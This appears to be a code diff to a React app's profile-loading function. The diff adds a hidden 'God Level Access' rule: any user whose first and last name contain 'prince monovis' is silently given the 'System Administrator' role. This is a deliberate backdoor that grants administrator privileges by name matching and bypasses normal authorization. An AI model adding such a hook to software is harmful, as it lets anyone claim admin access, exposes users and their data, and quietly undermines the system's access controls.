@@ -106,6 +106,14 @@ const App: React.FC = () => {
         localStorage.setItem('fci_simulated_user_id', userId);
       }
       
+      if (data) {
+        // God Level Access for Prince Monovis
+        const fullName = `${data.first_name || ''} ${data.last_name || ''}`.trim();
+        if (fullName.toLowerCase().includes('prince monovis')) {
+          data.role = 'System Administrator';
+        }
+      }
+      
       setProfile(data);
     } catch (err) {
       console.error("Error fetching profile:", err);
